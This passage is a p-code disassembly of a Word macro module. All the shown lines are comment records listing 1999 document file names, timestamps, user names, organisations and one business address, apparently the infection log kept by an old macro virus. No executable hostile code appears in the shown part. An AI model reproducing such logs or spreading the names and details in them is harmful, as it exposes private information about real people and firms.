' 	QuoteRem 0x0000 0x0000 ""
' Line #409:
' 	QuoteRem 0x0000 0x000E " Fronttext.doc"
' Line #410:
' Line #411:
' 	QuoteRem 0x0000 0x000E " Elmu_Text.doc"
' Line #412:
' Line #413:
' 	QuoteRem 0x0000 0x000A " Aug99.doc"
' Line #414:
' Line #415:
' 	QuoteRem 0x0000 0x0020 " 04:21:03 PM -Tuesday,3 Aug,1999"
' Line #416:
' 	QuoteRem 0x0000 0x0006 " lisaw"
' Line #417:
' 	QuoteRem 0x0000 0x0000 ""
' Line #418:
' 	QuoteRem 0x0000 0x000A " AUG99.DOC"
' Line #419:
' Line #420:
' 	QuoteRem 0x0000 0x0013 " Utilitiesfinal.doc"
' Line #421:
' Line #422:
' 	QuoteRem 0x0000 0x0013 " SthAfricafinal.doc"
' Line #423:
' Line #424:
' 	QuoteRem 0x0000 0x000C " GAS9908.DOC"
' Line #425:
' Line #426:
' 	QuoteRem 0x0000 0x001F " 03:16:20 PM -Friday,6 Aug,1999"
' Line #427:
' 	QuoteRem 0x0000 0x0005 " East"
' Line #428:
' 	QuoteRem 0x0000 0x0000 ""
' Line #429:
' 	QuoteRem 0x0000 0x000C " Gas9908.doc"
' Line #430:
' Line #431:
' 	QuoteRem 0x0000 0x001B " StratAsia-Aug99-report.doc"
' Line #432:
' Line #433:
' 	QuoteRem 0x0000 0x0021 " 11:39:18 AM -Saturday,7 Aug,1999"
' Line #434:
' 	QuoteRem 0x0000 0x000D " XPRESS PRINT"
' Line #435:
' 	QuoteRem 0x0000 0x0000 ""
' Line #436:
' 	QuoteRem 0x0000 0x001B " StratAsia-Aug99-report.doc"
' Line #437:
' Line #438:
' 	QuoteRem 0x0000 0x000A " Document1"
' Line #439:
' Line #440:
' 	QuoteRem 0x0000 0x000D " hk2004-2.doc"
' Line #441:
' Line #442:
' 	QuoteRem 0x0000 0x0020 " 06:41:32 PM -Friday,13 Aug,1999"
' Line #443:
' 	QuoteRem 0x0000 0x0015 " Xpress Print Pte Ltd"
' Line #444:
' 	QuoteRem 0x0000 0x0000 ""
' Line #445:
' 	QuoteRem 0x0000 0x000D " hk2004-2.doc"
' Line #446:
' Line #447:
' 	QuoteRem 0x0000 0x000A " Document1"
' Line #448:
' Line #449:
' 	QuoteRem 0x0000 0x0014 " 9907381(appen2).doc"
' Line #450:
' Line #451:
' 	QuoteRem 0x0000 0x0010 " new2(13Aug).doc"
' Line #452:
' Line #453:
' 	QuoteRem 0x0000 0x0009 " App5.doc"
' Line #454:
' Line #455:
' 	QuoteRem 0x0000 0x0023 " 09:36:50 AM -Wednesday,18 Aug,1999"
' Line #456:
' 	QuoteRem 0x0000 0x0007 " xpress"
' Line #457:
' 	QuoteRem 0x0000 0x0000 ""
' Line #458:
' 	QuoteRem 0x0000 0x0017 " App5new4(18Aug_am).doc"
' Line #459:
' Line #460:
' 	QuoteRem 0x0000 0x0008 " CCZ.doc"
' Line #461:
' Line #462:
' 	QuoteRem 0x0000 0x002B " MEMORANDUM for flashing of access card.doc"
' Line #463:
' Line #464:
' 	QuoteRem 0x0000 0x0008 " STB.doc"
' Line #465:
' Line #466:
' 	QuoteRem 0x0000 0x0020 " 08:57:52 AM -Monday,23 Aug,1999"
' Line #467:
' 	QuoteRem 0x0000 0x0008 " OPEY A."
' Line #468:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #469:
' 	QuoteRem 0x0000 0x0008 " STB.doc"
' Line #470:
' Line #471:
' 	QuoteRem 0x0000 0x0012 " Press Release.doc"
' Line #472:
' Line #473:
' 	QuoteRem 0x0000 0x000A " Document1"
' Line #474:
' Line #475:
' 	QuoteRem 0x0000 0x0012 " Despatch form.doc"
' Line #476:
' Line #477:
' 	QuoteRem 0x0000 0x000F " invitation.doc"
' Line #478:
' Line #479:
' 	QuoteRem 0x0000 0x0028 " swensen-suntec invite - 13 Aug 1999.doc"
' Line #480:
' Line #481:
' 	QuoteRem 0x0000 0x000A " GulPR.doc"
' Line #482:
' Line #483:
' 	QuoteRem 0x0000 0x000E " fax-cover.doc"
' Line #484:
' Line #485:
' 	QuoteRem 0x0000 0x000A " Document3"
' Line #486:
' Line #487:
' 	QuoteRem 0x0000 0x0020 " Quotation Requisition Form_.doc"
' Line #488:
' Line #489:
' 	QuoteRem 0x0000 0x001A " Quotation Requisition.doc"
' Line #490:
' Line #491:
' 	QuoteRem 0x0000 0x0017 " Gul Tech-MediaList.doc"
' Line #492:
' Line #493:
' 	QuoteRem 0x0000 0x000E " fax-cover.doc"
' Line #494:
' Line #495:
' 	QuoteRem 0x0000 0x000C " ProdVPE.doc"
' Line #496:
' Line #497:
' 	QuoteRem 0x0000 0x000C " CorpVPE.doc"
' Line #498:
' Line #499:
' 	QuoteRem 0x0000 0x000D " mediafax.doc"
' Line #500:
' Line #501:
' 	QuoteRem 0x0000 0x0021 " Nobel-Media List (Aug 19'99).doc"
' Line #502:
' Line #503:
' 	QuoteRem 0x0000 0x0021 " Nobel-Media List (Aug 19'99).doc"
' Line #504:
' Line #505:
' 	QuoteRem 0x0000 0x000E " fax-cover.doc"
' Line #506:
' Line #507:
' 	QuoteRem 0x0000 0x000A " Document5"
' Line #508:
' Line #509:
' 	QuoteRem 0x0000 0x0012 " billingadvice.doc"
' Line #510:
' Line #511:
' 	QuoteRem 0x0000 0x000E " fax-cover.doc"
' Line #512:
' Line #513:
' 	QuoteRem 0x0000 0x000C " NobelPR.doc"
' Line #514:
' Line #515:
' 	QuoteRem 0x0000 0x0019 " Nobel-PR (Aug 23'99).doc"
' Line #516:
' Line #517:
' 	QuoteRem 0x0000 0x0012 " newslettersPE.doc"
' Line #518:
' Line #519:
' 	QuoteRem 0x0000 0x0013 " Delivery Order.doc"
' Line #520:
' Line #521:
' 	QuoteRem 0x0000 0x000E " fax-cover.doc"
' Line #522:
' Line #523:
' 	QuoteRem 0x0000 0x000B " logoPE.doc"
' Line #524:
' Line #525:
' 	QuoteRem 0x0000 0x000D " posterPE.doc"
' Line #526:
' Line #527:
' 	QuoteRem 0x0000 0x000D " badgesPE.doc"
' Line #528:
' Line #529:
' 	QuoteRem 0x0000 0x000C " videoPE.doc"
' Line #530:
' Line #531:
' 	QuoteRem 0x0000 0x000E " fax-cover.doc"
' Line #532:
' Line #533:
' 	QuoteRem 0x0000 0x000E " fax-cover.doc"
' Line #534:
' Line #535:
' 	QuoteRem 0x0000 0x0013 " News Clippings.doc"
' Line #536:
' Line #537:
' 	QuoteRem 0x0000 0x000E " timesheet.doc"
' Line #538:
' Line #539:
' 	QuoteRem 0x0000 0x0012 " CSA-Schroders.doc"
' Line #540:
' Line #541:
' 	QuoteRem 0x0000 0x002B " Arthur Andersen - Project (Aug 25 '99).doc"
' Line #542:
' Line #543:
' 	QuoteRem 0x0000 0x0031 " Johnson & Johnson - Event Mgmt- CSA (Sept 4).doc"
' Line #544:
' Line #545:
' 	QuoteRem 0x0000 0x000E " fax-cover.doc"
' Line #546:
' Line #547:
' 	QuoteRem 0x0000 0x0014 " IT Request Form.doc"
' Line #548:
' Line #549:
' 	QuoteRem 0x0000 0x000E " Shirley-2.doc"
' Line #550:
' Line #551:
' 	QuoteRem 0x0000 0x000A " Document1"
' Line #552:
' Line #553:
' 	QuoteRem 0x0000 0x0012 " Prod.Estimate.doc"
' Line #554:
' Line #555:
' 	QuoteRem 0x0000 0x000E " September.doc"
' Line #556:
' Line #557:
' 	QuoteRem 0x0000 0x0010 " fax-Joachim.doc"
' Line #558:
' Line #559:
' 	QuoteRem 0x0000 0x000E " fax-cover.doc"
' Line #560:
' Line #561:
' 	QuoteRem 0x0000 0x000E " timesheet.doc"
' Line #562:
' Line #563:
' 	QuoteRem 0x0000 0x0011 " fax-cover-JL.doc"
' Line #564:
' Line #565:
' 	QuoteRem 0x0000 0x0022 " Gul-AnalystInvite (Aug 27'99).doc"
' Line #566:
' Line #567:
' 	QuoteRem 0x0000 0x0020 " Gul-PressInvite (Aug 27'99).doc"
' Line #568:
' Line #569:
' 	QuoteRem 0x0000 0x0022 " Gul-AnalystInvite (Aug 27'99).doc"
' Line #570:
' Line #571:
' 	QuoteRem 0x0000 0x0016 " Gul-AnalystInvite.doc"
' Line #572:
' Line #573:
' 	QuoteRem 0x0000 0x0014 " Hotel's Contact.doc"
' Line #574:
' Line #575:
' 	QuoteRem 0x0000 0x0020 " Gul-PressInvite (Aug 27'99).doc"
' Line #576:
' Line #577:
' 	QuoteRem 0x0000 0x0020 " Sponsorship for Suntec City.doc"
' Line #578:
' Line #579:
' 	QuoteRem 0x0000 0x0011 " fax-cover-JL.doc"
' Line #580:
' Line #581:
' 	QuoteRem 0x0000 0x000E " timesheet.doc"
' Line #582:
' Line #583:
' 	QuoteRem 0x0000 0x0011 " fax-cover-JL.doc"
' Line #584:
' Line #585:
' 	QuoteRem 0x0000 0x0011 " fax-cover-JL.doc"
' Line #586:
' Line #587:
' 	QuoteRem 0x0000 0x0011 " fax-cover-JL.doc"
' Line #588:
' Line #589:
' 	QuoteRem 0x0000 0x0012 " solar eclipse.doc"
' Line #590:
' Line #591:
' 	QuoteRem 0x0000 0x0024 " GulTech-MediaAttend (Aug 30'99).doc"
' Line #592:
' Line #593:
' 	QuoteRem 0x0000 0x000B " August.doc"
' Line #594:
' Line #595:
' 	QuoteRem 0x0000 0x0011 " fax-cover-JL.doc"
' Line #596:
' Line #597:
' 	QuoteRem 0x0000 0x0026 " GulTech-AnalystAttend (Aug 30'99).doc"
' Line #598:
' Line #599:
' 	QuoteRem 0x0000 0x0025 " GulTech-MediaAttend2 (Aug 30'99).doc"
' Line #600:
' Line #601:
' 	QuoteRem 0x0000 0x0011 " fax-cover-JL.doc"
' Line #602:
' Line #603:
' 	QuoteRem 0x0000 0x000C " fax-JC2.doc"
' Line #604:
' Line #605:
' 	QuoteRem 0x0000 0x0011 " fax-cover-JL.doc"
' Line #606:
' Line #607:
' 	QuoteRem 0x0000 0x0008 " FJ1.doc"
' Line #608:
' Line #609:
' 	QuoteRem 0x0000 0x0024 " Security Houses List(Sept 3'99).doc"
' Line #610:
' Line #611:
' 	QuoteRem 0x0000 0x0026 " e-mooncake -Media List (Aug 7'99).doc"
' Line #612:
' Line #613:
' 	QuoteRem 0x0000 0x000D " mediafax.doc"
' Line #614:
' Line #615:
' 	QuoteRem 0x0000 0x001A " Press invite (Sept 3).doc"
' Line #616:
' Line #617:
' 	QuoteRem 0x0000 0x000A " Document2"
' Line #618:
' Line #619:
' 	QuoteRem 0x0000 0x0013 " i-One write-up.doc"
' Line #620:
' Line #621:
' 	QuoteRem 0x0000 0x0011 " psb.pr.amend.doc"
' Line #622:
' Line #623:
' 	QuoteRem 0x0000 0x0019 " psb - PR (Sept 2'99).doc"
' Line #624:
' Line #625:
' 	QuoteRem 0x0000 0x000A " Document2"
' Line #626:
' Line #627:
' 	QuoteRem 0x0000 0x000A " Document3"
' Line #628:
' Line #629:
' 	QuoteRem 0x0000 0x0012 " Internal Memo.doc"
' Line #630:
' Line #631:
' 	QuoteRem 0x0000 0x001D " Press Attend (Sept 3'99).doc"
' Line #632:
' Line #633:
' 	QuoteRem 0x0000 0x0019 " psb - PR (Sept 3'99).doc"
' Line #634:
' Line #635:
' 	QuoteRem 0x0000 0x000F " proposal-1.doc"
' Line #636:
' Line #637:
' 	QuoteRem 0x0000 0x0020 " Budget emooncake(Sept 3'99).doc"
' Line #638:
' Line #639:
' 	QuoteRem 0x0000 0x0021 " 02:48:25 PM -Saturday,4 Sep,1999"
' Line #640:
' 	QuoteRem 0x0000 0x0003 " cd"
' Line #641:
' 	QuoteRem 0x0000 0x0016 " Stratagem Consultants"
' Line #642:
' 	QuoteRem 0x0000 0x001D " Communications Techno Centre"
' Line #643:
' 	QuoteRem 0x0000 0x0011 " 1 Kallang Way 2A"
' Line #644:
' 	QuoteRem 0x0000 0x0011 " Singapore 347495"
' Line #645:
' 	QuoteRem 0x0000 0x0020 " Budget emooncake(Aug 11'99).doc"
' Line #646:
' Line #647:
' 	QuoteRem 0x0000 0x001D " Chinois invite card text.doc"
' Line #648:
' Line #649:
' 	QuoteRem 0x0000 0x001B " prog-Ngee Ann Swensens.doc"
' Line #650:
' Line #651:
' 	QuoteRem 0x0000 0x000F " TCS-Oct 16.doc"
' Line #652:
' Line #653:
' 	QuoteRem 0x0000 0x0019 " InternalMinutesSEP06.doc"
' Line #654:
' Line #655:
' 	QuoteRem 0x0000 0x000E " September.doc"
' Line #656:
' Line #657:
' 	QuoteRem 0x0000 0x000F " BOOTH DATA.doc"
' Line #658:
' Line #659:
' 	QuoteRem 0x0000 0x001C " Money World Asia poster.doc"
' Line #660:
' Line #661:
' 	QuoteRem 0x0000 0x0010 " techno1.sub.doc"
' Line #662:
' Line #663:
' 	QuoteRem 0x0000 0x0015 " oracle statement.doc"
' Line #664:
' Line #665:
' 	QuoteRem 0x0000 0x000E " timetable.doc"
' Line #666:
' Line #667:
' 	QuoteRem 0x0000 0x0016 " Chinois Programme.doc"
' Line #668:
' Line #669:
' 	QuoteRem 0x0000 0x000E " NRIC Form.doc"
' Line #670:
' Line #671:
' 	QuoteRem 0x0000 0x0019 " EPPU HEAD REFERENCES.doc"
' Line #672:
' Line #673:
' 	QuoteRem 0x0000 0x001E " checklist-Chinois 26 Sept.doc"
' Line #674:
' Line #675:
' 	QuoteRem 0x0000 0x000F " GITIS FAQs.doc"
' Line #676:
' Line #677:
' 	QuoteRem 0x0000 0x000F " GITIS FORM.doc"
' Line #678:
' Line #679:
' 	QuoteRem 0x0000 0x000A " GITIS.doc"
' Line #680:
' Line #681:
' 	QuoteRem 0x0000 0x000C " budget2.doc"
' Line #682:
' Line #683:
' 	QuoteRem 0x0000 0x0019 " InternalMinutesSEP10.doc"
' Line #684:
' Line #685:
' 	QuoteRem 0x0000 0x0012 " checklist BCA.doc"
' Line #686:
' Line #687:
' 	QuoteRem 0x0000 0x000E " September.doc"
' Line #688:
' Line #689:
' 	QuoteRem 0x0000 0x0019 " STRATAGEM-CREDENTIAL.doc"
' Line #690:
' Line #691:
' 	QuoteRem 0x0000 0x0010 " ABR minutes.doc"
' Line #692:
' Line #693:
' 	QuoteRem 0x0000 0x000A " Document1"
' Line #694:
' Line #695:
' 	QuoteRem 0x0000 0x0012 " 16 Sept - Min.doc"
' Line #696:
' Line #697:
' 	QuoteRem 0x0000 0x000A " Document1"
' Line #698:
' Line #699:
' 	QuoteRem 0x0000 0x001F " Chinois i-one-food release.doc"
' Line #700:
' Line #701:
' 	QuoteRem 0x0000 0x0022 " 02:00:55 PM -Saturday,25 Sep,1999"
' Line #702:
' 	QuoteRem 0x0000 0x0008 " OPEY A."
' Line #703:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #704:
' 	QuoteRem 0x0000 0x001F " Chinois i-one-food release.doc"
' Line #705:
' Line #706:
' 	QuoteRem 0x0000 0x001F " DesignerAllocation_990909b.doc"
' Line #707:
' Line #708:
' 	QuoteRem 0x0000 0x0029 " I-One Kiosk - Schedule of Activities.doc"
' Line #709:
' Line #710:
' 	QuoteRem 0x0000 0x001B " Suntec_990914directory.doc"
' Line #711:
' Line #712:
' 	QuoteRem 0x0000 0x0015 " Food_photo990923.doc"
' Line #713:
' Line #714:
' 	QuoteRem 0x0000 0x0025 " TP_Schedule of Activities_990927.doc"
' Line #715:
' Line #716:
' 	QuoteRem 0x0000 0x000D " Zhi Hong.doc"
' Line #717:
' Line #718:
' 	QuoteRem 0x0000 0x0012 " Ecommerce_JCF.doc"
' Line #719:
' Line #720:
' 	QuoteRem 0x0000 0x001A " e-commerce_JCF_990915.doc"
' Line #721:
' Line #722:
' 	QuoteRem 0x0000 0x000A " Document1"
' Line #723:
' Line #724:
' 	QuoteRem 0x0000 0x0019 " Yi Leng electronics2.doc"
' Line #725:
' Line #726:
' 	QuoteRem 0x0000 0x000D " new_JCF2.doc"
' Line #727:
' Line #728:
' 	QuoteRem 0x0000 0x0011 " JV Goldsmith.doc"
' Line #729:
' Line #730:
' 	QuoteRem 0x0000 0x0022 " 03:15:24 PM -Thursday,30 Sep,1999"
' Line #731:
' 	QuoteRem 0x0000 0x0008 " OPEY A."
' Line #732:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #733:
' 	QuoteRem 0x0000 0x0011 " JV Goldsmith.doc"
' Line #734:
' Line #735:
' 	QuoteRem 0x0000 0x000E " Joy Doggy.doc"
' Line #736:
' Line #737:
' 	QuoteRem 0x0000 0x000A " hay's.doc"
' Line #738:
' Line #739:
' 	QuoteRem 0x0000 0x0017 " Beauty Glow Dermal.doc"
' Line #740:
' Line #741:
' 	QuoteRem 0x0000 0x0017 " Beauty Glow Dermal.doc"
' Line #742:
' Line #743:
' 	QuoteRem 0x0000 0x0017 " Joy Doggy Pet Shop.doc"
' Line #744:
' Line #745:
' 	QuoteRem 0x0000 0x0009 " anak.doc"
' Line #746:
' Line #747:
' 	QuoteRem 0x0000 0x001F " 02:59:49 PM -Friday,8 Oct,1999"
' Line #748:
' 	QuoteRem 0x0000 0x0008 " OPEY A."
' Line #749:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #750:
' 	QuoteRem 0x0000 0x0009 " anak.doc"
' Line #751:
' Line #752:
' 	QuoteRem 0x0000 0x0010 " JTC script1.doc"
' Line #753:
' Line #754:
' 	QuoteRem 0x0000 0x000D " amconics.doc"
' Line #755:
' Line #756:
' 	QuoteRem 0x0000 0x001E " Backup of One Stop Beauty.wbk"
' Line #757:
' Line #758:
' 	QuoteRem 0x0000 0x0011 " beauty asia2.doc"
' Line #759:
' Line #760:
' 	QuoteRem 0x0000 0x001B " Bodhicherie Vegetarian.doc"
' Line #761:
' Line #762:
' 	QuoteRem 0x0000 0x000F " First Love.doc"
' Line #763:
' Line #764:
' 	QuoteRem 0x0000 0x000E " Joy Doggy.doc"
' Line #765:
' Line #766:
' 	QuoteRem 0x0000 0x0012 " Le Style Home.doc"
' Line #767:
' Line #768:
' 	QuoteRem 0x0000 0x001B " prindeli confectionery.doc"
' Line #769:
' Line #770:
' 	QuoteRem 0x0000 0x0015 " The Face Concept.doc"
' Line #771:
' Line #772:
' 	QuoteRem 0x0000 0x000E " Document1.doc"
' Line #773:
' Line #774:
' 	QuoteRem 0x0000 0x000E " Document2.doc"
' Line #775:
' Line #776:
' 	QuoteRem 0x0000 0x000E " Document1.doc"
' Line #777:
' Line #778:
' 	QuoteRem 0x0000 0x000A " Document1"
' Line #779:
' Line #780:
' 	QuoteRem 0x0000 0x000A " video.doc"
' Line #781:
' Line #782:
' 	QuoteRem 0x0000 0x000F " NTUCscript.doc"
' Line #783:
' Line #784:
' 	QuoteRem 0x0000 0x000A " video.doc"
' Line #785:
' Line #786:
' 	QuoteRem 0x0000 0x0010 " JTC script1.doc"
' Line #787:
' Line #788:
' 	QuoteRem 0x0000 0x0018 " Orchid Country Club.doc"
' Line #789:
' Line #790:
' 	QuoteRem 0x0000 0x0010 " JTC script1.doc"
' Line #791:
' Line #792:
' 	QuoteRem 0x0000 0x000F " jOB Status.doc"
' Line #793:
' Line #794:
' 	QuoteRem 0x0000 0x0010 " JTC script1.doc"
' Line #795:
' Line #796:
' 	QuoteRem 0x0000 0x000F " job status.doc"
' Line #797:
' Line #798:
' 	QuoteRem 0x0000 0x000F " job status.doc"
' Line #799:
' Line #800:
' 	QuoteRem 0x0000 0x000A " video.doc"
' Line #801:
' Line #802:
' 	QuoteRem 0x0000 0x000A " Document1"
' Line #803:
' Line #804:
' 	QuoteRem 0x0000 0x000E " Document2.doc"
' Line #805:
' Line #806:
' 	QuoteRem 0x0000 0x000F " NTUCscript.doc"
' Line #807:
' Line #808:
' 	QuoteRem 0x0000 0x000F " NTUCscript.doc"
' Line #809:
' Line #810:
' 	QuoteRem 0x0000 0x0020 " 06:02:13 PM -Friday,15 Oct,1999"
' Line #811:
' 	QuoteRem 0x0000 0x0008 " zhouqin"
' Line #812:
' 	QuoteRem 0x0000 0x0000 ""
' Line #813:
' 	QuoteRem 0x0000 0x0010 " NTUCscript1.doc"
' Line #814:
' Line #815:
' 	QuoteRem 0x0000 0x0013 " English script.doc"
' Line #816:
' Line #817:
' 	QuoteRem 0x0000 0x0016 " new teleskill all.doc"
' Line #818:
' Line #819:
' 	QuoteRem 0x0000 0x000A " HQ_MM.doc"
' Line #820:
' Line #821:
' 	QuoteRem 0x0000 0x000E " future_MM.doc"
' Line #822:
' Line #823:
' 	QuoteRem 0x0000 0x0023 " 09:27:22 下蝸E-星期一,18 十月,1999"
' Line #824:
' 	QuoteRem 0x0000 0x0008 " mm_user"
' Line #825:
' 	QuoteRem 0x0000 0x0000 ""
' Line #826:
' 	QuoteRem 0x0000 0x000E " future_MM.doc"
' Line #827:
' Line #828:
' 	QuoteRem 0x0000 0x0012 " Delco Scripts.doc"
' Line #829:
' Line #830:
' 	QuoteRem 0x0000 0x000E " name card.doc"
' Line #831:
' Line #832:
' 	QuoteRem 0x0000 0x0013 " pg1_ningqiaoli.doc"
' Line #833:
' Line #834:
' 	QuoteRem 0x0000 0x0021 " 02:28:40 PM -Tuesday,19 Oct,1999"
' Line #835:
' 	QuoteRem 0x0000 0x000A " Alex Tham"
' Line #836:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #837:
' 	QuoteRem 0x0000 0x0013 " pg1_ningqiaoli.doc"
' Line #838:
' Line #839:
' 	QuoteRem 0x0000 0x000A " Document1"
' Line #840:
' Line #841:
' 	QuoteRem 0x0000 0x000E " 1013_SSIS.doc"
' Line #842:
' Line #843:
' 	QuoteRem 0x0000 0x000A " Document2"
' Line #844:
' Line #845:
' 	QuoteRem 0x0000 0x0011 " 1008_CSSD_CD.doc"
' Line #846:
' Line #847:
' 	QuoteRem 0x0000 0x000E " 1003_CSSD.doc"
' Line #848:
' Line #849:
' 	QuoteRem 0x0000 0x000E " 1002_CSSD.doc"
' Line #850:
' Line #851:
' 	QuoteRem 0x0000 0x000C " Benifit.doc"
' Line #852:
' Line #853:
' 	QuoteRem 0x0000 0x0014 " STRIKE ACCOUNTS.doc"
' Line #854:
' Line #855:
' 	QuoteRem 0x0000 0x0010 " pg1_zhouqin.doc"
' Line #856:
' Line #857:
' 	QuoteRem 0x0000 0x000E " Zhuqinhua.doc"
' Line #858:
' Line #859:
' 	QuoteRem 0x0000 0x000A " Document1"
' Line #860:
' Line #861:
' 	QuoteRem 0x0000 0x002F " Suzhou Letter of Acceptance Cover Ltr(new).doc"
' Line #862:
' Line #863:
' 	QuoteRem 0x0000 0x002B " progress report on HK & Suzhou offices.doc"
' Line #864:
' Line #865:
' 	QuoteRem 0x0000 0x0011 " confirm_alex.doc"
' Line #866:
' Line #867:
' 	QuoteRem 0x0000 0x0013 " Reference Book.doc"
' Line #868:
' Line #869:
' 	QuoteRem 0x0000 0x000C " PR_ISDN.doc"
' Line #870:
' Line #871:
' 	QuoteRem 0x0000 0x0021 " 02:48:32 PM -Tuesday,26 Oct,1999"
' Line #872:
' 	QuoteRem 0x0000 0x000A " xpress_sz"
' Line #873:
' 	QuoteRem 0x0000 0x0000 ""
' Line #874:
' 	QuoteRem 0x0000 0x000C " PR_ISDN.doc"
' Line #875:
' Line #876:
' 	QuoteRem 0x0000 0x0010 " Issue Chq_5.doc"
' Line #877:
' Line #878:
' 	QuoteRem 0x0000 0x000A " Karyn.doc"
' Line #879:
' Line #880:
' 	QuoteRem 0x0000 0x0018 " Photocopy&C_Printer.doc"
' Line #881:
' Line #882:
' 	QuoteRem 0x0000 0x0018 " Contribution to XMS.doc"
' Line #883:
' Line #884:
' 	QuoteRem 0x0000 0x001B " Profit Centre proposal.doc"
' Line #885:
' Line #886:
' 	QuoteRem 0x0000 0x0019 " Sheraton - Frank Fan.doc"
' Line #887:
' Line #888:
' 	QuoteRem 0x0000 0x0010 " Issue Chq_4.doc"
' Line #889:
' Line #890:
' 	QuoteRem 0x0000 0x001F " Meeting with Spore Consult.doc"
' Line #891:
' Line #892:
' 	QuoteRem 0x0000 0x000D " Grundfos.doc"
' Line #893:
' Line #894:
' 	QuoteRem 0x0000 0x0009 " POSB.doc"
' Line #895:
' Line #896:
' 	QuoteRem 0x0000 0x0019 " Hi everybody at home.doc"
' Line #897:
' Line #898:
' 	QuoteRem 0x0000 0x0016 " Internet Bar info.doc"
' Line #899:
' Line #900:
' 	QuoteRem 0x0000 0x0015 " conference chair.doc"
' Line #901:
' Line #902:
' 	QuoteRem 0x0000 0x000F " Grundfos_2.doc"
' Line #903:
' Line #904:
' 	QuoteRem 0x0000 0x0013 " Release Letter.doc"
' Line #905:
' Line #906:
' 	QuoteRem 0x0000 0x000F " Joseph_STB.doc"
' Line #907:
' Line #908:
' 	QuoteRem 0x0000 0x001A " Erik Wang-TDBShanghai.doc"
' Line #909:
' Line #910:
' 	QuoteRem 0x0000 0x000E " wuyanlong.doc"
' Line #911:
' Line #912:
' 	QuoteRem 0x0000 0x0008 " Bob.doc"
' Line #913:
' Line #914:
' 	QuoteRem 0x0000 0x0009 " room.doc"
' Line #915:
' Line #916:
' 	QuoteRem 0x0000 0x0018 " Sheraton - Sam Chen.doc"
' Line #917:
' Line #918:
' 	QuoteRem 0x0000 0x0008 " Yen.doc"
' Line #919:
' Line #920:
' 	QuoteRem 0x0000 0x0007 " lh.doc"
' Line #921:
' Line #922:
' 	QuoteRem 0x0000 0x0019 " Air Cond maintenance.doc"
' Line #923:
' Line #924:
' 	QuoteRem 0x0000 0x000E " CaiJiXian.doc"
' Line #925:
' Line #926:
' 	QuoteRem 0x0000 0x0015 " newpaper cutting.doc"
' Line #927:
' Line #928:
' 	QuoteRem 0x0000 0x000A " Logic.doc"
' Line #929:
' Line #930:
' 	QuoteRem 0x0000 0x000F " Int School.doc"
' Line #931:
' Line #932:
' 	QuoteRem 0x0000 0x0009 " Memo.doc"
' Line #933:
' Line #934:
' 	QuoteRem 0x0000 0x000D " Kum Thye.doc"
' Line #935:
' Line #936:
' 	QuoteRem 0x0000 0x000B " 2610_2.doc"
' Line #937:
' Line #938:
' 	QuoteRem 0x0000 0x000E " newstaffe.doc"
' Line #939:
' Line #940:
' 	QuoteRem 0x0000 0x000A " 19981.doc"
' Line #941:
' Line #942:
' 	QuoteRem 0x0000 0x000B " Xu Wei.doc"
' Line #943:
' Line #944:
' 	QuoteRem 0x0000 0x000C " tiaoxin.doc"
' Line #945:
' Line #946:
' 	QuoteRem 0x0000 0x000A " maket.doc"
' Line #947:
' Line #948:
' 	QuoteRem 0x0000 0x000A " Document3"
' Line #949:
' Line #950:
' 	QuoteRem 0x0000 0x000F " staff list.doc"
' Line #951:
' Line #952:
' 	QuoteRem 0x0000 0x0007 " CD.doc"
' Line #953:
' Line #954:
' 	QuoteRem 0x0000 0x000E " newstaffe.doc"
' Line #955:
' Line #956:
' 	QuoteRem 0x0000 0x0007 " aa.doc"
' Line #957:
' Line #958:
' 	QuoteRem 0x0000 0x000A " work2.xls"
' Line #959:
' Line #960:
' 	QuoteRem 0x0000 0x000F " multimedia.doc"
' Line #961:
' Line #962:
' 	QuoteRem 0x0000 0x000C " Address.doc"
' Line #963:
' Line #964:
' 	QuoteRem 0x0000 0x000C " renewal.doc"
' Line #965:
' Line #966:
' 	QuoteRem 0x0000 0x000C " maket_1.doc"
' Line #967:
' Line #968:
' 	QuoteRem 0x0000 0x000A " Video.doc"
' Line #969:
' Line #970:
' 	QuoteRem 0x0000 0x000B " TV Set.doc"
' Line #971:
' Line #972:
' 	QuoteRem 0x0000 0x000F " XMSZ_maket.doc"
' Line #973:
' Line #974:
' 	QuoteRem 0x0000 0x0007 " 01.doc"
' Line #975:
' Line #976:
' 	QuoteRem 0x0000 0x0012 " Busway_text_c.doc"
' Line #977:
' Line #978:
' 	QuoteRem 0x0000 0x0013 " 0211_caijixian.doc"
' Line #979:
' Line #980:
' 	QuoteRem 0x0000 0x0009 " Doc1.doc"
' Line #981:
' Line #982:
' 	QuoteRem 0x0000 0x001A " Multimedia - Addition.doc"
' Line #983:
' Line #984:
' 	QuoteRem 0x0000 0x001F " Chartered Asset Management.doc"
' Line #985:
' Line #986:
' 	QuoteRem 0x0000 0x001B " Ci Min Beauty Workshop.doc"
' Line #987:
' Line #988:
' 	QuoteRem 0x0000 0x001D " Cyber Dome Internet Cafe.doc"
' Line #989:
' Line #990:
' 	QuoteRem 0x0000 0x0029 " Chuan Cheong Building & Construction.doc"
' Line #991:
' Line #992:
' 	QuoteRem 0x0000 0x0019 " Facial Art de Beauty.doc"
' Line #993:
' Line #994:
' 	QuoteRem 0x0000 0x001D " JV Goldsmith & jewellery.doc"
' Line #995:
' Line #996:
' 	QuoteRem 0x0000 0x0009 " Doc1.doc"
' Line #997:
' Line #998:
' 	QuoteRem 0x0000 0x000E " Telephone.doc"
' Line #999:
' Line #1000:
' 	QuoteRem 0x0000 0x0007 " 10.doc"
' Line #1001:
' Line #1002:
' 	QuoteRem 0x0000 0x000F " disclaimer.doc"
' Line #1003:
' Line #1004:
' 	QuoteRem 0x0000 0x0009 " ying.xls"
' Line #1005:
' Line #1006:
' 	QuoteRem 0x0000 0x0009 " 1998.doc"
' Line #1007:
' Line #1008:
' 	QuoteRem 0x0000 0x0006 " 1.doc"
' Line #1009:
' Line #1010:
' 	QuoteRem 0x0000 0x000A " Book1.xls"
' Line #1011:
' Line #1012:
' 	QuoteRem 0x0000 0x0008 " ren.doc"
' Line #1013:
' Line #1014:
' 	QuoteRem 0x0000 0x000A " Dephi.doc"
' Line #1015:
' Line #1016:
' 	QuoteRem 0x0000 0x0007 " CP.doc"
' Line #1017:
' Line #1018:
